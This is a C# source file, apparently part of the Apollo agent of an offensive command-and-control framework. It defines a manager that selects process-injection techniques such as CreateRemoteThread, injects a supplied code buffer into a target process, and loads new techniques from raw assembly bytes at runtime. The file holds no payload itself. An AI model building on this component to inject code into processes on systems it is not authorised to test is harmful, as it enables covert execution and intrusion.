using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Injection
{
    public class InjectionManager : IInjectionManager
    {
        private IAgent _agent;
        private Type _currentTechnique = typeof(Techniques.CreateRemoteThread);
        private ConcurrentDictionary<string, Type> _loadedTechniques = new ConcurrentDictionary<string, Type>();
        public InjectionManager(IAgent agent)
        {
            _agent = agent;
            foreach (Type t in Assembly.GetCallingAssembly().GetTypes())
            {
                if (t.Namespace == "Injection.Techniques" &&
                    t.IsPublic &&
                    t.IsClass &&
                    t.IsVisible)
                {
                    _loadedTechniques[t.Name] = t;
                }
            }
        }

        public InjectionTechnique CreateInstance(byte[] code, int pid)
        {
            return (InjectionTechnique)Activator.CreateInstance(
                _currentTechnique,
                new object[] { _agent, code, pid });
        }

        public InjectionTechnique CreateInstance(byte[] code, IntPtr hProcess)
        {
            return (InjectionTechnique)Activator.CreateInstance(
                _currentTechnique,
                new object[] { _agent, code, hProcess });
        }

        public string[] GetTechniques()
        {
            return _loadedTechniques.Keys.ToArray();
        }

        public bool LoadTechnique(byte[] assembly, string name)
        {
            bool bRet = false;
            Assembly tmp = Assembly.Load(assembly);
            foreach(Type t in tmp.GetTypes())
            {
                if (t.Name == name)
                {
                    _loadedTechniques[name] = t;
                    bRet = true;
                    break;
                }
            }
            return bRet;
        }

        public bool SetTechnique(string technique)
        {
            if (!_loadedTechniques.ContainsKey(technique))
            {
                return false;
            }
            _currentTechnique = _loadedTechniques[technique];
            return true;
        }
    }
}
